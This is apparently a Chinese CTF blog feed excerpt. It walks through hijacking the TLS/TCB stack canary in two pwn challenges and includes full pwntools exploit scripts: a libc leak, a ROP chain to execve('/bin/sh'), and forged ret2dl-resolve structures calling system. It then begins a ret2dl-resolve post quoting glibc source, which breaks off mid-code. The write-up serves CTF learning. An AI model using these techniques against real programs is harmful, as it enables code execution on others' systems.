    <content type="html"><![CDATA[<h2 id="TLS的简单介绍"><a href="#TLS的简单介绍" class="headerlink" title="TLS的简单介绍"></a>TLS的简单介绍</h2><p>我这里就不详细说明TLS的实现了，因为太复杂了(我没看懂)。具体实现过程可以参考<a class="link"   href="https://dere.press/2020/10/18/glibc-tls/" >https://dere.press/2020/10/18/glibc-tls/<i class="fas fa-external-link-alt"></i></a></p><p>对于TLS其实是线程局部存储 (TLS) 是一种存储持续期（storage duration），对象的存储是在线程开始时分配，线程结束时回收，每个线程有该对象自己的实例。</p><p>对于TLS的变量是每一个线程所独有的，维护canary的TCB结构的也就是tls。他会在每一个线程申请自己的空间，并且在验证时也是拿自己线程所在的作比较，我们可以通过canary的实现来观察TCB结构体的位置。</p><p><img src="/images/image-20220204150152003.png" alt="image-20220204150152003"></p><p>很好可以理解实在fs偏移28个位置的值作为canary。</p><p>下面是TCB结构体的定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">void</span> *tcb;</span><br><span class="line"><span class="comment">/* Pointer to the TCB.</span></span><br><span class="line"><span class="comment">Not necessarily the</span></span><br><span class="line"><span class="comment">thread descriptor used by libpthread.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">dtv_t</span> *dtv;</span><br><span class="line"><span class="keyword">void</span> *self;</span><br><span class="line"><span class="comment">/* Pointer to the thread descriptor.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span> multiple_threads;</span><br><span class="line"><span class="keyword">int</span> gscope_flag;</span><br><span class="line"><span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line"><span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line"><span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line"><span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> feature_1;</span><br><span class="line"><span class="keyword">int</span> __glibc_unused1;</span><br><span class="line"><span class="comment">/* Reservation of some values for the TM ABI.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line"><span class="comment">/* GCC split stack support.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">void</span> *__private_ss;</span><br><span class="line"><span class="comment">/* The lowest address of shadow stack,</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> ssp_base;</span><br><span class="line"><span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">like AddressSanitizer, depend on the size of tcbhead_t.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">__128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line"><span class="keyword">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>也可以看到在fs:28h的位置也就是<strong>stack_guard</strong></p><h2 id="Q1-HGAME-enter-the-evil-pwn-land"><a href="#Q1-HGAME-enter-the-evil-pwn-land" class="headerlink" title="Q1: HGAME enter_the_evil_pwn_land"></a>Q1: HGAME enter_the_evil_pwn_land</h2><h3 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h3><p><img src="/images/image-20220204150648050.png" alt="image-20220204150648050"></p><p>当时就是这道题卡住了我感觉自己好菜没资格打比赛就没打了。</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">test_thread</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xFFF</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, &amp;s[i], <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( s[i] == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目的内容很简单，存在0x1000个字节的栈溢出，但是只有一次puts的机会。</p><p>所以，按照以往思路覆盖canary的\x00显然是不能够的，所以我们直接劫持TLS。</p><p><img src="/images/image-20220204150911999.png" alt="image-20220204150911999"></p><p>可以看到canary的值是0xd491330997329e00。</p><p><img src="/images/image-20220204151011610.png" alt="image-20220204151011610"></p><p>再看TCB结构体可以看到canary确实就在偏移为0x28的地址上。</p><p><img src="/images/image-20220204151106209.png" alt="image-20220204151106209"></p><p>可以看到TCB结构体还正在栈上。因为我们是写入0x1000字节所以显然能到这个位置。</p><p><img src="/images/image-20220204151314464.png" alt="image-20220204151314464"></p><p>read开始的位置距离TCB结构体的距离是0x840。</p><h3 id="综上得出exp"><a href="#综上得出exp" class="headerlink" title="综上得出exp:"></a>综上得出exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000401363</span></span><br><span class="line">ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line">vuln_fun = elf.sym[<span class="string">&#x27;test_thread&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">fsbase = u64((<span class="string">b&#x27;\x00&#x27;</span>+r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(fsbase))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x8</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdi) + \</span><br><span class="line">    p64(puts_got)+p64(puts_plt)+p64(vuln_fun)</span><br><span class="line">payload = payload.ljust(<span class="number">0x840</span>)+p64(fsbase)*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x000000000011c371</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x8</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdi) + \</span><br><span class="line">    p64(bin_sh_addr)+p64(pop_rsi)+p64(<span class="number">0</span>) + \</span><br><span class="line">    p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(libc.sym[<span class="string">&#x27;execve&#x27;</span>]+libc_base)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="Q2-BUUCTF-PWN-gyctf-2020-bfnote"><a href="#Q2-BUUCTF-PWN-gyctf-2020-bfnote" class="headerlink" title="Q2: BUUCTF-PWN gyctf_2020_bfnote"></a>Q2: BUUCTF-PWN gyctf_2020_bfnote</h2><h3 id="保护检查"><a href="#保护检查" class="headerlink" title="保护检查"></a>保护检查</h3><p><img src="/images/image-20220204160150112.png" alt="image-20220204160150112"></p><p>这道题目需要昨天的re2dlresolve的知识，没看过的师傅可以去看看<a href="https://cv196082.gitee.io/2022/02/03/ret2dl-runtime-resolve/">ret2dl-resolve</a></p><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+8h] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// [esp+Ch] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">50</span>]; <span class="comment">// [esp+1Ah] [ebp-3Eh] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  start_menu();</span><br><span class="line">  fwrite(<span class="string">&quot;\nGive your description : &quot;</span>, <span class="number">1u</span>, <span class="number">0x19</span>u, <span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  read_0(<span class="number">0</span>, s, <span class="number">0x600</span>);                          <span class="comment">// 栈溢出</span></span><br><span class="line">  fwrite(<span class="string">&quot;Give your postscript : &quot;</span>, <span class="number">1u</span>, <span class="number">0x17</span>u, <span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;unk_804A060, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">  read_0(<span class="number">0</span>, &amp;unk_804A060, <span class="number">0x600</span>);</span><br><span class="line">  fwrite(<span class="string">&quot;\nGive your notebook size : &quot;</span>, <span class="number">1u</span>, <span class="number">0x1B</span>u, <span class="built_in">stdout</span>);</span><br><span class="line">  size = input_int();</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, size);</span><br><span class="line">  fwrite(<span class="string">&quot;Give your title size : &quot;</span>, <span class="number">1u</span>, <span class="number">0x17</span>u, <span class="built_in">stdout</span>);</span><br><span class="line">  v4 = input_int();</span><br><span class="line">  <span class="keyword">for</span> ( i = v4; size - <span class="number">0x20</span> &lt; i; i = input_int() )</span><br><span class="line">    fwrite(<span class="string">&quot;invalid ! please re-enter :\n&quot;</span>, <span class="number">1u</span>, <span class="number">0x1C</span>u, <span class="built_in">stdout</span>);</span><br><span class="line">  fwrite(<span class="string">&quot;\nGive your title : &quot;</span>, <span class="number">1u</span>, <span class="number">0x13</span>u, <span class="built_in">stdout</span>);</span><br><span class="line">  read_0(<span class="number">0</span>, v3, i);                           </span><br><span class="line">  fwrite(<span class="string">&quot;Give your note : &quot;</span>, <span class="number">1u</span>, <span class="number">0x11</span>u, <span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v3[v4 + <span class="number">16</span>], size - v4 - <span class="number">16</span>);        <span class="comment">// 任意地址写</span></span><br><span class="line">  fwrite(<span class="string">&quot;\nnow , check your notebook :\n&quot;</span>, <span class="number">1u</span>, <span class="number">0x1D</span>u, <span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;title : %s&quot;</span>, v3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;note : %s&quot;</span>, &amp;v3[v4 + <span class="number">16</span>]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>别人可以用tls直接查看这个地址，但是我试了几次都不行所以就用了search查找canary来查找</p><p><img src="/images/image-20220204165245380.png" alt="image-20220204165245380"></p><p>可以看到他存放的位置其实是共享映射区域，所以他的相对偏移是固定的。所以如果我们malloc一个很大的chunk(size&gt;=0x20000)，那么系统就被迫使用mmap给我们分配，根据mmap的机制我们分配的chunk就一定在tcbhead_t地址的低地址处。再根据上面main函数的漏洞就很容易修改掉canary的值了。</p><p>思路就是分配一个大小为0x20000的堆块到canary上面去，然后计算他们之间偏移，利用上面的任意地址写修改canary的值。但是由于题目当中的输出函数是fwrite或者fprintf。我们的ROPgadget不够，所以选择使用ret2dl-resolve。</p><p>这道题恶心人的一点</p><p><img src="/images/image-20220204192008172.png" alt="image-20220204192008172"></p><p>在main函数最后并不是普通的leave  retn，在最后的时候esp的值会变到ebp+var_4-4的值，所以在构造ROP的时候不能在栈上面构造。</p><h3 id="最终得到exp"><a href="#最终得到exp" class="headerlink" title="最终得到exp:"></a>最终得到exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28441</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;./gyctf_2020_bfnote&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./gyctf_2020_bfnote&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;../buu_libc/x86/libc-2.23.so&#x27;</span>)</span><br><span class="line">bss_start = <span class="number">0x0804A060</span></span><br><span class="line">gap = <span class="number">0x500</span></span><br><span class="line">stack_overflow = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x3e</span> - <span class="number">0xc</span> + <span class="number">0x8</span>) + p64(bss_start + gap + <span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Give your description : &#x27;</span>)</span><br><span class="line">r.send(stack_overflow)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Give your postscript : &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym = p32(bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span> + <span class="number">0x8</span> - <span class="number">0x80482C8</span>) + \</span><br><span class="line">    p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line">fake_rel = p32(bss_start) + p32(<span class="number">0x7</span> + ((bss_start + gap + <span class="number">0x4</span> *</span><br><span class="line">                                        <span class="number">4</span> + <span class="number">0x8</span> + <span class="number">0x8</span> + <span class="number">0x8</span> - <span class="number">0x080481D8</span>) // <span class="number">0x10</span>) * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;\x00&#x27;</span> * gap + p32(<span class="number">0x08048450</span>) + p32(bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span> + <span class="number">0x8</span> * <span class="number">2</span> - <span class="number">0x080483D0</span>) +</span><br><span class="line">       p32(<span class="number">0</span>) + p32(bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;system\x00\x00&#x27;</span> + fake_rel + fake_sym)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Give your notebook size : &#x27;</span>)</span><br><span class="line">r.send(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x20000</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your title size : &#x27;</span>)</span><br><span class="line">r.send(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0xf7d22714</span> - <span class="number">0xf7d01008</span> - <span class="number">16</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;invalid ! please re-enter :\n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your title : &#x27;</span>)</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your note : &#x27;</span>)</span><br><span class="line">r.send(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a class="link"   href="https://blog.csdn.net/seaaseesa/article/details/104479071" >https://blog.csdn.net/seaaseesa/article/details/104479071<i class="fas fa-external-link-alt"></i></a></p><p>(我挺喜欢这个博主的不过他这次是伪造的link_map把我都看蒙了，后面发现都用的p32那就用32位的方式伪造呗，这样简便很多)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;TLS的简单介绍&quot;&gt;&lt;a href=&quot;#TLS的简单介绍&quot; class=&quot;headerlink&quot; title=&quot;TLS的简单介绍&quot;&gt;&lt;/a&gt;TLS的简单介绍&lt;/h2&gt;&lt;p&gt;我这里就不详细说明TLS的实现了，因为太复杂了(我没看懂)。具体实现过程可以参考&lt;a cla</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="ret2dl-runtime-resolve" scheme="https://cv196082.gitee.io/tags/ret2dl-runtime-resolve/"/>
    
    <category term="劫持TLS结构" scheme="https://cv196082.gitee.io/tags/%E5%8A%AB%E6%8C%81TLS%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>ret2dl-runtime-resolve</title>
    <link href="https://cv196082.gitee.io/2022/02/03/ret2dl-runtime-resolve/"/>
    <id>https://cv196082.gitee.io/2022/02/03/ret2dl-runtime-resolve/</id>
    <published>2022-02-03T03:22:31.000Z</published>
    <updated>2022-02-04T10:51:38.733Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间因为身体原因摆烂了一周多了，今天又才重新开始做题，报了几场比赛都没能打成就很烦。</p><h2 id="ret2dl-runtime-resolve"><a href="#ret2dl-runtime-resolve" class="headerlink" title="ret2dl-runtime-resolve"></a>ret2dl-runtime-resolve</h2><p>首先ELF文件的引用外部文件的加载方式分为三种FULL_RELRO、PARTIAL_RELRO、NO_RELRO，在后面两种的情况下存在地址延迟加载。</p><h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO_RELRO"></a>NO_RELRO</h3><p><img src="/images/image-20220203123130058.png" alt="image-20220203123130058"></p><p>可以看到在第一次调用read函数的时候，此时会先根据GOT表的位置进行jmp到read@plt+6的位置，然后经过两次push之后到_dl_runtime_resolve函数。</p><p>在源码中dl_runtime_resolve函数只是call了一下_dl_fixup函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> reloc_offset  </span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> reloc_offset reloc_arg  </span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> reloc_index  reloc_arg / sizeof (PLTREL)  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">DL_FIXUP_VALUE_TYPE  </span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE  </span><br><span class="line">_dl_fixup (  </span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS  </span></span><br><span class="line">    ELF_MACHINE_RUNTIME_FIXUP_ARGS,  </span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span>  </span></span><br><span class="line">    struct link_map *l, ElfW(Word) reloc_arg) &#123;  </span><br><span class="line">    <span class="comment">//获取symtab（存放dynsym的数组）  </span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab  </span></span><br><span class="line"><span class="function">        </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);  </span><br><span class="line">    <span class="comment">//获取strtab(存放符号名的数组)   </span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);  </span><br><span class="line">    <span class="comment">//获取reloc_arg对应的rel.plt项   </span></span><br><span class="line">    <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc  </span><br><span class="line">        = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  </span><br><span class="line">    <span class="comment">//获取reloc_arg对应的dynsym   </span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  </span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;  </span><br><span class="line">    <span class="comment">//指向对应的got表，以便将解析结果写回去   </span></span><br><span class="line">    <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);  </span><br><span class="line">    <span class="keyword">lookup_t</span> result;  </span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span>  </span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == 